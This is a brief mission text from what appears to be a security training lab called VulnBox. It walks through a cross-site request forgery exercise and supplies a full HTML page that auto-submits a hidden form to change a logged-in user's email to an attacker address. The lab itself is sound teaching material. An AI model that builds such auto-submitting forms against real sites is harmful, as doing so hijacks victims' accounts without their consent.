Mission Brief

This page is vulnerable to CSRF. Your goal is to create a malicious HTML file that, when opened by a logged-in user, will force their browser to change their email to "attacker@example.com".

  1. Create a new file on your computer named csrf_attack.html.
  2. Paste the following code into the file.
  3. Make sure you are logged into VulnBox, then open the csrf_attack.html file in the same browser.
<html> <body> <form action="http://127.0.0.1:8000/lab/csrf/" method="POST"> <input type="hidden" name="email" value="attacker@example.com" /> </form> <script> document.forms[0].submit(); </script> </body> </html>
